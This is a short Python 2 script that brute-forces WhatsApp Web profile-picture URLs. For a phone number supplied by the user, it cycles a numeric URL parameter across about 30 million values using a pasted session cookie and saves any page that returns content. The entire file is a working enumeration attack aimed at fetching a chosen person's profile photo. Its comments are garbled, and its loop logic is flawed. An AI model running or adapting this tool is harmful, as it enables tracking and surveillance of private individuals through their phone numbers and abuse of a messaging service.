# Libraries
import os
import urllib2

# Ask for the phone
tlfn = raw_input("Tlfn number (Ej: 34123985643):  ")

# cookie
cookie = "cookieValue" # <--- Here at cookie
cookie = str(cookie)

# i original (Number of the second variable of the web app url )
i = 1410000000
while (i < 1439999999): # loop to cycle through all posibiidades the value i.
	i += 1 # i 've to add a value to be repeated each time the loop
	z = "%40" # cleaning up the url ( giving problems)
	url = "https://web.whatsapp.com/pp?t=l&u=" + str(tlfn) + z + "c.us&i=" + str(i) # URL to which the agreed script ( use str to pass the number to string)
	print("\n" + tlfn + "\t" + str(i)) # to show information that is displayed ( I'll find a telephone and value of i in each attempt )
	print(url) # Information displayed on screen (url)
	print("\n")
	opener = urllib2.build_opener()
	opener.addheaders.append(("Cookie", "cookiename=" + cookie)) # Asignar Cookie
	f = opener.open(url) # urllib establishes and download the url
	result = f.read() # We read the content of the page
	if (result != ""): # if no picture , the page is empty (if not found this shows the message [ would agree that there parase the sript but as { return phase ? } ] )
		print("Encontrado!")
		file = open("profilePicture.html", "w") # profilePicture.html create the file ...
		file.write(result) # ... and write the content of result (line 24) profilePicture.html
		file.close() # close the file file
	else: # if the content of the page is blank, continue to the next value of i
	 	continue

print("No profile photo was found... :(")
